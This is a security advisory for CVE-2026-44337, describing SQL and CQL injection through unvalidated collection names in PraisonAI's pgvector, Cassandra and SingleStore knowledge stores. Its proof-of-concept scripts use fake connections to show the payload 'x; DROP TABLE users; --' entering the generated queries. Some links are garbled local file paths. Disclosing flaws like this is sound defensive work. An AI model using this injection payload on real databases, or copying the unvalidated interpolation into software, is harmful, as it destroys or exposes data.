# [M] PraisonAI knowledge-store backends interpolate unvalidated collection names into SQL and CQL queries

## Summary
Severity: Medium
Advisory: GHSA-3643-7v76-5cj2
CVE: CVE-2026-44337
CWE: CWE-20, CWE-89
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-3643-7v76-5cj2
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=2.4.1 <4.6.34

## Details
### Summary
PraisonAI exposes optional SQL/CQL-backed knowledge-store implementations that build table and index identifiers from unvalidated `name` and `collection` arguments. Applications that pass untrusted collection names into these backends can trigger SQL or CQL injection.

### Details
This issue affects the public persistence layer exported by [persistence/__init__.py](/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/__init__.py:1), which exposes `KnowledgeStore` and `create_knowledge_store()`. The factory wires the affected backends as supported knowledge-store providers in [[persistence/factory.py](https://github.com/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/factory.py:112)](/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/[persistence/factory.py](https://github.com/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/factory.py:162):112):

- `pgvector` at [[persistence/factory.py](https://github.com/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/factory.py:170)](/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/[persistence/factory.py](https://github.com/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/factory.py:186):162)
- `cassandra` at [persistence/factory.py](/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/factory.py:170)
- `singlestore_vector` at [persistence/factory.py](/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/factory.py:186)

The common root cause is that the `KnowledgeStore` interface accepts free-form collection names in `create_collection()`, `delete_collection()`, `insert()`, `upsert()`, `search()`, `get()`, `delete()`, and `count()` at [[persistence/knowledge/base.py](https://github.com/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/knowledge/base.py:44)](/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/knowledge/base.py:44), but the affected backends interpolate those values directly into query text instead of validating or quoting them.

Representative sinks:

- `SingleStoreVectorKnowledgeStore` builds `table_name = f"{self.table_prefix}{name}"` and executes raw DDL in [[persistence/knowledge/singlestore_vector.py](https://github.com/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/knowledge/singlestore_vector.py:92)](/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/knowledge/singlestore_vector.py:92). The same pattern is reused for `delete_collection`, `insert`, `upsert`, `search`, `get`, `delete`, and `count`.
- `PGVectorKnowledgeStore` builds `public.praison_vec_{collection}` and `idx_{name}_embedding` directly into SQL in [[persistence/knowledge/pgvector.py](https://github.com/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/knowledge/pgvector.py:82)](/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/knowledge/pgvector.py:82).
- `CassandraKnowledgeStore` interpolates `name` and `collection` directly into `CREATE TABLE`, `DROP TABLE`, `INSERT`, `SELECT`, `DELETE`, and `COUNT` statements in [[persistence/knowledge/cassandra.py](https://github.com/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/knowledge/cassandra.py:73)](/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/knowledge/cassandra.py:73).

There is already an internal identifier validator in the conversation persistence layer:

- `validate_identifier()` only allows alphanumeric characters and underscores in [[persistence/conversation/base.py](https://github.com/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/conversation/base.py:18)](/Users/shmulc/Stuff/tmp/first-cve/scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence/conversation/base.py:18)

That validator is used for SQL identifiers such as `table_prefix` and `schema` in the conversation stores, but no equivalent validation is applied in the affected knowledge-store backends.

Version scope:

- `pgvector.py` and `cassandra.py` were already present by `v2.4.1`
- `singlestore_vector.py` was present by `v2.4.3`
- the current PyPI release on May 1, 2026 is `4.6.33`, and the same interpolation patterns are still present

Scope note for maintainers: I did not identify a built-in PraisonAI HTTP endpoint that forwards external request data into these specific persistence methods. The issue is in the package's public persistence APIs and affects applications that pass untrusted collection names to the affected backends.

### PoC
The following local reproductions show that attacker-controlled collection names become part of the executed SQL text.

1. Reproduce the `SingleStoreVectorKnowledgeStore.delete_collection()` query construction:

```bash
python3 - <<'PY'
import importlib.util
import pathlib
import sys
import types

base = pathlib.Path("scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence")

mods = {
    "praisonai": types.ModuleType("praisonai"),
    "praisonai.persistence": types.ModuleType("praisonai.persistence"),
    "praisonai.persistence.knowledge": types.ModuleType("praisonai.persistence.knowledge"),
}
for k, v in mods.items():
    v.__path__ = []
    sys.modules[k] = v

def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod

load("praisonai.persistence.knowledge.base", base / "knowledge" / "base.py")
ss = load("praisonai.persistence.knowledge.singlestore_vector", base / "knowledge" / "singlestore_vector.py")

class FakeCursor:
    def __init__(self, parent): self.parent = parent
    def execute(self, query, params=None): self.parent.calls.append((query, params))
    def __enter__(self): return self
    def __exit__(self, *args): return False

class FakeConn:
    def __init__(self): self.calls = []
    def cursor(self): return FakeCursor(self)

store = ss.SingleStoreVectorKnowledgeStore()
store._initialized = True
store._conn = FakeConn()
store.delete_collection("x; DROP TABLE users; --")
print(store._conn.calls[-1][0].strip())
PY
```

Observed result:

```text
DROP TABLE IF EXISTS praisonai_x; DROP TABLE users; --
```

2. Reproduce the `PGVectorKnowledgeStore.create_collection()` query construction:

```bash
python3 - <<'PY'
import importlib.util
import pathlib
import sys
import types

base = pathlib.Path("scans/variant-hunt/PraisonAI/src/praisonai/praisonai/persistence")

mods = {
    "praisonai": types.ModuleType("praisonai"),
    "praisonai.persistence": types.ModuleType("praisonai.persistence"),
    "praisonai.persistence.knowledge": types.ModuleType("praisonai.persistence.knowledge"),
}
for k, v in mods.items():
    v.__path__ = []
    sys.modules[k] = v

def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod

load("praisonai.persistence.knowledge.base", base / "knowledge" / "base.py")

psycopg2 = types.ModuleType("psycopg2")
extras = types.ModuleType("psycopg2.extras")
pool = types.ModuleType("psycopg2.pool")
class DummyPool:
    def __init__(self, *a, **k): pass
    def getconn(self): return None
    def putconn(self, c): pass
pool.ThreadedConnectionPool = DummyPool
extras.RealDictCursor = object
psycopg2.pool = pool
sys.modules["psycopg2"] = psycopg2
sys.modules["psycopg2.pool"] = pool
sys.modules["psycopg2.extras"] = extras

pg = load("praisonai.persistence.knowledge.pgvector", base / "knowledge" / "pgvector.py")

class FakeCursor:
    def __init__(self, parent): self.parent = parent
    def execute(self, query, params=None): self.parent.calls.append((query, params))
    def __enter__(self): return self
    def __exit__(self, *args): return False

class FakeConn:
    def __init__(self): self.calls = []
    def cursor(self): return FakeCursor(self)
    def commit(self): pass

store = pg.PGVectorKnowledgeStore(auto_create_extension=False)
conn = FakeConn()
store._get_conn = lambda: conn
store._put_conn = lambda c: None
store.create_collection("x; DROP TABLE users; --", 3)
for query, _ in conn.calls:
    print(query.strip())
PY
```

Observed result includes:

```text
CREATE TABLE IF NOT EXISTS public.praison_vec_x; DROP TABLE users; -- (
CREATE INDEX IF NOT EXISTS idx_x; DROP TABLE users; --_embedding
```

The Cassandra backend follows the same pattern in its `CREATE TABLE`, `DROP TABLE`, `INSERT`, `SELECT`, and `DELETE` statements.

### Impact
This issue affects applications that use PraisonAI's optional SQL/CQL knowledge-store backends and pass untrusted collection names into them.

Potential impact depends on backend and driver behavior, but includes:

- malformed queries and backend errors
- access to unintended tables or indexes
- execution of attacker-influenced SQL or CQL text where the backend/driver accepts the resulting statement shape

I did not confirm direct exposure through PraisonAI's built-in HTTP server surfaces, so this is best understood as a vulnerability in the package's public persistence APIs rather than a turnkey remote exploit in the default application server.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-3643-7v76-5cj2
- https://nvd.nist.gov/vuln/detail/CVE-2026-44337
- https://github.com/MervinPraison/PraisonAI
